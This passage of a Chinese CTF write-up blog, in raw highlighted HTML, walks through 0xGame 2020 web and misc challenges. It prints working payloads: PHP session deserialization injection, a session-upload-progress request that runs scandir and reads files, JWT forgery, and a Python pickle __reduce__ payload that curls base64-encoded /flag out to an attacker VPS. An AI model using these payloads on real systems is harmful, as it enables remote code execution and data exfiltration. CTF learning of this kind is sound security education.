variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'register success!'</span><span class="token punctuation">.</span><span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string">'&lt;a href="profile.php">click hear to see your motto&lt;/a>'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'empty username or password!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span></code></pre><p><code>profile.php</code>:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">require_once</span> <span class="token string">'class.php'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ini_set('session.serialize_handler','php_serialize');</span><span class="token function">session_save_path</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$info</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'出错啦！读取不到你的格言QWQ'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>class.php</code>:</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$motto</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">register</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'password'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">password</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'motto'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">motto</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'motto'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'your motto:'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">motto</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span><span class="token operator">===</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>我们需要让 <code>$this-&gt;admin=1</code>，从而显示 flag。</p><p>PHP 在反序列化存储的 <code>$_SESSION</code> 数据时使用的引擎和序列化使用的引擎不一样，从而引入了漏洞。</p><p>PHP 里有三种序列化引擎，其中默认使用的是 <code>php</code> 引擎。</p><blockquote><ul><li><code>php_binary</code>: 存储方式是，键名的长度对应的 ASCII 字符+键名+经过 serialize() 函数序列化处理的值</li><li><code>php</code>: 存储方式是，键名+竖线+经过 serialize() 函数序列处理的值</li><li><code>php_serialize</code> (php&gt;5.5.4): 存储方式是，经过 serialize() 函数序列化处理的值</li></ul></blockquote><p>PHP 里的 SESSION 是保存在文件里的，文件名格式为 <code>sess_PHPSESSID</code>，例如：</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028175323244.png" alt="PHPSESSID"></p><p>根据 hint，profile 里的应该用的是默认的 php 序列化引擎，而 register 里用的是 <code>php_serialize</code>。</p><p>profile 里需要 <code>isset($_SESSION['username'])</code> 才能进入，而这个 session 是在注册时 User 类里设置的， 即 <code>$_SESSION['username'] = $this-&gt;username;</code>。</p><p>访问 profile 时执行 <code>session_start();</code> 语句时从文件中读取 session，将其反序列化。</p><p>那么我们先构造一个序列化好的对象，编写一段 php 代码来得到。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">info</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$motto</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">motto</span> <span class="token operator">=</span> <span class="token string">"adfs"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string">"admin"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$x</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>得到序列化后的为：</p><pre><code>O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}</code></pre><p>在最前面加上 <code>|</code>，放到<code>username</code>里。</p><p>register 里使用 <code>php_serialize</code> 执行 <code>$_SESSION['username'] = $this-&gt;username;</code> 语句时，session 文件中存储的内容为</p><pre><code>a:1:{s:8:"username";s:82:"|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}";}</code></pre><p>而 profile 在 <code>session_start();</code> 执行读取时将这个文件里的内容进行反序列化。</p><p>将 <code>|</code> 之前的内容作为 SESSION 的 key，之后的内容作为 value，拿去 unserialize。</p><p>即 key 为 <code>a:1:{s:8:"username";s:82:"</code>， value 为 <code>O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}";}</code>。</p><p>于是在访问 profile 页面时，会反序列化伪造的数据，实例化 info 对象，最后就会把 admin 置为1了。</p><hr><p>先本地试试，构造 payload 如下。</p><pre><code>username=|O:4:"info":3:{s:5:"admin";i:1;s:8:"username";s:5:"admin";s:5:"motto";s:4:"adfs";}password=adminmotto=ddd</code></pre><p>session 文件中的内容如下。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028175202241.png" alt="session name"></p><p>访问 profile 页面时成功把 admin 置为1，获取了 <code>flag.php</code> 页面内容。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171415054.png" alt="local"></p><p>再拿去远程跑。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171844484.png" alt="form"></p><p>得到 flag。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028171714526.png" alt="flag"></p><blockquote><p><strong>References &amp; Extensive Reading:</strong></p><p><a href="https://blog.csdn.net/qq_35569814/article/details/101019333" target="_blank" rel="noopener">PHP中的ini_set()函数介绍</a></p><p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">PHP中SESSION反序列化机制</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/7839256.html" target="_blank" rel="noopener">PHP反序列化漏洞</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105890170" target="_blank" rel="noopener">Session序列化选择器漏洞（ini_set(‘session.serialize_handler’, ‘php’);）</a></p></blockquote><p>上面有文章还介绍了另一种漏洞。</p><blockquote><p>若 <code>session.upload_progress.enabled</code> 为 On，当一个上传在处理中，同时 POST 一个与 INI 中设置的 <code>session.upload_progress.name</code> 同名变量时，当 PHP 检测到这种 POST 请求时，它会在 <code>$_SESSION</code> 中添加一组数据，即就可以将 filename 的值赋值到 session 中。所以可以通过 <strong>Session Upload Progress</strong> 来设置 session。</p></blockquote><p>例如 <a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a> 这一题。</p><p>通过构造一个上传页面，如</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://web.jarvisoj.com:32784/index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>PHP_SESSION_UPLOAD_PROGRESS<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>123aaa<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></code></pre><p>HTTP 如下，<strong>注意要带上 Cookie</strong>。</p><pre><code>POST /index.php HTTP/1.1Host: web.jarvisoj.com:32784User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateCookie: PHPSESSID=jnmfjqfll0kttv9cf6i7dfhh32Content-Type: multipart/form-data; boundary=---------------------------395747469534482322661051838442Content-Length: 436Connection: closeUpgrade-Insecure-Requests: 1-----------------------------395747469534482322661051838442Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"123asdaf-----------------------------395747469534482322661051838442Content-Disposition: form-data; name="file"; filename="|O:5:\"OowoO\":1:{s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";}"Content-Type: text/plainxxxxx-----------------------------395747469534482322661051838442--</code></pre><p>表单里带上 <code>PHP_SESSION_UPLOAD_PROGRESS</code>，再修改 filename 就能再 session 加载时利用反序列化把内容加载到 SESSION 中。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028180153958.png" alt="scanfile"></p><p>再利用 <code>file_get_contents</code> 结合当前路径读取文件即可。</p><pre class=" language-php"><code class="language-php"><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028180841912.png" alt="read flag"></p><h3 id="Web-JWT"><a href="#Web-JWT" class="headerlink" title="Web_JWT"></a>Web_JWT</h3><p><a href="http://web.game.0xctf.com:30107/" target="_blank" rel="noopener">http://web.game.0xctf.com:30107/</a></p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028000841267.png" alt="login"></p><p>随意输入用户名密码去登录，根据返回的 cookie 得到 JWT (JSON Web Token)。</p><p>参考之前的 <a href="https://miaotony.xyz/2020/05/30/CTF_2020NUAACTF/#web2-jwt">NUAACTF web2-jwt</a>，利用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener"><strong>c-jwt-cracker</strong></a> 跑出 secret。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001232047.png" alt="secret"></p><p>secret 即 <code>njupt</code>。</p><p>拿去 jwt.io 加密一下就好了，然后改掉 payload 里的 <code>role</code> 为 <code>admin</code>。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001342451.png" alt="jwt"></p><p>最后把 cookie 改成 Encoded 里的那个就完事了。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028001502881.png" alt="flag"></p><h3 id="Web-easyPython"><a href="#Web-easyPython" class="headerlink" title="Web_easyPython"></a>Web_easyPython</h3><blockquote><ul><li>人生苦短，我用Python</li><li>登录admin</li><li>登录成功与否不是必要的，重要在过程，仔细看看bak</li><li><a href="http://web.game.0xctf.com:30108/" target="_blank" rel="noopener">题目地址</a></li></ul></blockquote><p>首先点击 Tips 拿到题目的源代码。</p><p>关键代码：</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># home page</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># @login_required</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    usercookies <span class="token operator">=</span> request<span class="token punctuation">.</span>cookies<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'Cookies'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token operator">not</span> usercookies<span class="token punctuation">:</span>        usercookies <span class="token operator">=</span> <span class="token string">"{'username':'guest'}"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        usercookies <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>usercookies<span class="token punctuation">)</span><span class="token punctuation">)</span>    resp <span class="token operator">=</span> make_response<span class="token punctuation">(</span>render_template<span class="token punctuation">(</span><span class="token string">'index.html'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    resp<span class="token punctuation">.</span>set_cookie<span class="token punctuation">(</span><span class="token string">'Cookies'</span><span class="token punctuation">,</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>usercookies<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resp</code></pre><p>这里很明显看到了<code>pickle</code>，而且根据提示与登陆与否无关，那就是这里了。</p><p>这里 <code>pickle.loads</code> 反序列化时貌似没有过滤，于是可以传一个 object 过去，在实例化的时候调用 <code>__reduce()__</code> 方法，执行这里面的内容。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">import</span> pickletools<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'miaotony'</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>os<span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">'curl http://VPS:PORT/`cat /flag | base64`'</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>User<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>payload_64 <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload_64<span class="token punctuation">)</span></code></pre><p>把这个生成的 base64 编码的 payload 作为 <code>Cookies</code>，修改后重新访问，理论上就能在 VPS 上拿到 base64 编码的 flag。</p><p>然而并没有成功。。打过去之后返回 500 Internal Server Error.</p><p>比赛结束之后看了官方WP，才知道原来是操作系统的锅，我这个是在 Windows 下生成的。</p><p>这个序列化的结果还与操作系统有关系。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201105235424496.png" alt="nt"></p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201105235523612.png" alt="官方WP"></p><p>修改为 <code>posix</code>，或者在 Linux 下生成就没这个问题了。</p><p>另外发现需要去掉 pickle 的版本标识 <code>\x80\x03</code>.我用的 opcode 是 Python3 下的 版本3。</p><p>于是我这个 payload 就是</p><pre class=" language-python"><code class="language-python">b<span class="token string">'cposix\nsystem\nX3\x00\x00\x00curl http://VPS:PORT/`cat /flag | base64`\x85R.'</span></code></pre><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000045787.png" alt="payload"></p><p>修改 Cookies，在 VPS 上接收一下，拿到 flag。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201106000321983.png" alt="flag"></p><h3 id="Misc-flip"><a href="#Misc-flip" class="headerlink" title="Misc_flip"></a>Misc_flip</h3><p><code>pwd.mp3</code> 一听就是电报了，老摩斯了。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028161431879.png" alt="Morse Code"></p><p>读出来是</p><pre><code>....- ----- ----- ---.. ..... -.... -.... ----. ----. ...-- ----- ----- ... .. -.. .-. --- .-- ... ... .- .--.</code></pre><p> 解码得到</p><pre><code>400856699300SIDROWSSAP</code></pre><p>一看就是倒过来了的，那就倒回去。</p><pre><code>PASSWORDIS003996658004</code></pre><p>拿 <code>003996658004</code> 去解压 <code>galf_si_siht_2.zip</code>，得到 <code>galf_si_siht.zip</code>。</p><p>发现打不开，放到 010 Editor 里，发现套了两个 zip，老缝合怪了。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028163048687.png" alt="504B0304"></p><p>分别把两个 zip 提取出来。</p><p><code>password.txt</code>:</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028163217484.png" alt="image-20201028163217484"></p><blockquote><p>I want to write file in binary, but something seems to be wrong?</p></blockquote><p>看到末尾一位都是0，盲猜是倒过来的 ASCII。写个脚本试试。</p><pre class=" language-python"><code class="language-python">s <span class="token operator">=</span> <span class="token triple-quoted-string string">"""1010011011010110......10011010"""</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>pwd<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l<span class="token punctuation">:</span>    x <span class="token operator">=</span> i<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    char <span class="token operator">=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>x<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    pwd <span class="token operator">+=</span> char    <span class="token keyword">print</span><span class="token punctuation">(</span>pwd<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pwd<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># You are so clever that this problem is just a piece of cake for you, the password is A_pi3ce_0f_C4ke</span></code></pre><p>得到密码为 <code>A_pi3ce_0f_C4ke</code>。</p><p>解压<code>galf_si_siht.png</code>。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028164030719.png" alt="galf_si_siht.png"></p><p>好家伙，又是倒过来的。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"galf_si_siht.png"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    img <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span>r<span class="token string">"galf_si_siht_fix.png"</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>img<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p>得到一张二维码。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201028164315941.png" alt="qrcode"></p><p>扫码得到 <a href="http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php" target="_blank" rel="noopener">http://am473ur.com/0xgame/flip/bd055250d3906d1f791d8e83b4396893.php</a></p><p><code>0xGame{b07906f9-f6f5-4120-9f80-01d761c8602e}</code></p><p><em>老套娃了（</em></p><h3 id="Misc-Hex酱"><a href="#Misc-Hex酱" class="headerlink" title="Misc_Hex酱"></a>Misc_Hex酱</h3><p>发现过滤的关键字其实只是命令里包含相应的字符而已，大写绕过就完事了~</p><p>不过还是日了一个晚上（（</p><p>之前还没怎么在 Windows 下整命令行，这次还特地去查了一番。</p><p>最开始还是绕了一大弯，本来不知道 flag 在哪，找了半天突然想到应该就在桌面上了。</p><p>当前路径是  <code>C:\Users\Administrator\Desktop\Game\HexQBot</code></p><p>通过环境变量和通配符，复制再读取 flag。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000235458.png" alt=""></p><p>后来突然想到不用这么复杂，直接读就完事了。</p><p><img src="/2020/11/05/CTF_2020_0xGame/image-20201027000757009.png" alt="flag"></p><p>后面问了出题的 Am473ur 师傅，这个返回内容的长度有了限制，所以有的指令发过去没有返回了。</p><p>另外这个 Hex酱 挺容易崩的，心疼一下运维师傅（</p><hr><h2 id="Week-3"><a href="#Week-3" class="headerlink" title="Week 3"></a>Week 3</h2><p>之前几周懒了，就随便看看题做做题，<strong>基本没写 WP</strong>，就这样8.</p><h3 id="Web-intval"><a href="#Web-intval" class="headerlink" title="Web_intval"></a>Web_intval</h3><p><strong>payload:</strong></p><blockquote><p><a href="http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3" target="_blank" rel="noopener">http://web.game.0xctf.com:30102/?0xGame=20201001%0a&amp;id=1024.3</a></p></blockquote><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"ffllaagg.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//1st</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'0xGame'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'20201001'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^20201001$/'</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'0xGame'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token keyword">echo</span> <span class="token string">'Good job!'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">;</span>   <span class="token keyword">else</span>       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Think it over!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//2nd</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$id</span><span class="token operator">=</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$id</span> <span class="token operator">===</span> <span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token string">'Congratulations!'</span><span class="token punctuation">.</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">die</span><span 